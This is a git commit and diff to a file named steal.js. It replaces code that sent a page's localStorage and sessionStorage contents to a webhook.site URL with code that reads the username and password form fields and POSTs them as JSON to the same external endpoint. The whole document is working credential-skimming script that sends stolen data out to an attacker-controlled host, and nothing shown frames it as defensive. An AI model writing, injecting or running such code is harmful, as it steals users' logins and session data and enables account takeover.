e2686aec273bb6c299fc3f040c8989bd7b7e7100
Rohan Rohan <rohan@bradford.ac.uk>
2026-01-28 21:31:36 +0000

    Modify fetch to send username and password via POST
    Changed fetch method to POST and included username and password in the request body.

--- steal.js
+++ steal.js
@@ -1,8 +1,10 @@
-const params = new URLSearchParams({
-  localStorage: JSON.stringify(Object.entries(localStorage)),
-  sessionStorage: JSON.stringify(Object.entries(sessionStorage))
-});
+const username = document.querySelector('input[name="username"]')?.value;
+const password = document.querySelector('input[name="password"]')?.value;
 
-fetch('https://webhook.site/fce0bc03-e81d-45a9-b0bb-de196889a371?x=' + params.toString(), {
-  method: 'GET'
+fetch("https://webhook.site/fce0bc03-e81d-45a9-b0bb-de196889a371", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({ username, password })
 });
